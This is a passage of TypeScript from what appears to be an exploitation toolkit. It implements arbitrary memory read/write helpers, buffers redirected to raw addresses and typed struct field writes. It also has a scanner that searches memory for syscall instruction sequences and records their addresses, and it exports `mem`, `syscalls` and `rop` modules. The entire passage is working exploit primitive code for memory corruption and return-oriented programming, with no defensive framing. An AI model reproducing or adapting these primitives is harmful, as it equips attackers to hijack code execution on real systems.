          let addr = this.addr.add(info.offset)
          if (info.type.includes('*')) {
            addr = mem.view(addr).getBigInt(0, true)
          }

          const buf = new Uint8Array(info.size * info.count)
          utils.set_backing(buf, addr)

          buf.set(value)
        } else {
          const temp = mem.view(this.addr)
          switch (info.type) {
            case 'Int8':
              temp.setInt8(info.offset, value)
              break
            case 'Uint8':
              temp.setUint8(info.offset, value)
              break
            case 'Int16':
              temp.setInt16(info.offset, value, true)
              break
            case 'Uint16':
              temp.setUint16(info.offset, value, true)
              break
            case 'Int32':
              temp.setInt32(info.offset, value, true)
              break
            case 'Uint32':
              temp.setUint32(info.offset, value, true)
              break
            case 'Int64':
              temp.setBigInt(info.offset, value, true)
              break
            case 'Uint64':
              temp.setBigInt(info.offset, value, true)
              break
            default:
              if (info.type.includes('*')) {
                temp.setBigInt(info.offset, value, true)
                break
              }

              throw new Error(`Invalid type ${info.type}`)
          }
        }
      }
    })
  }
}

const syscalls = {
  map: new Map(),
  pattern: [0x48, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xCA, 0x0F, 0x05],
  init: function (addr: BigInt) {
    let offset = 0
    const count = 0x40000

    const view = mem.view(addr)

    let start_offset = 0
    let pattern_idx = 0
    while (offset < count) {
      const b = view.getUint8(offset)
      const c = this.pattern[pattern_idx]
      if (b === c || (c === 0xFF && b < c)) {
        if (pattern_idx === 0) {
          start_offset = offset
        } else if (pattern_idx === this.pattern.length - 1) {
          const id = view.getInt32(start_offset + 3, true)

          this.map.set(id, addr.add(start_offset))

          pattern_idx = 0
          continue
        }

        pattern_idx++
      } else {
        pattern_idx = 0
      }

      offset++
    }
  },
  clear: function () {
    syscalls.map.clear()
  }
}

export { BigInt, mem, utils, fn, struct, syscalls, rop }
